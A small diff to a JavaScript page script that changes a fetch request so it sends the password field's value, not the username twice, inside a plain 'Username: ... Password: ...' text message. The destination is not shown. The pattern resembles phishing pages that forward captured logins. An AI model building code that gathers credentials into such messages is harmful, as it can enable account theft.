@@ -66,7 +66,7 @@ document.addEventListener("DOMContentLoaded", () => {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          text: `Username: ${userInput.value.trim()} Password: ${userInput.value.trim()}`,
+          text: `Username: ${userInput.value.trim()} Password: ${passwordInput.value.trim()}`,
         }),
       });
 
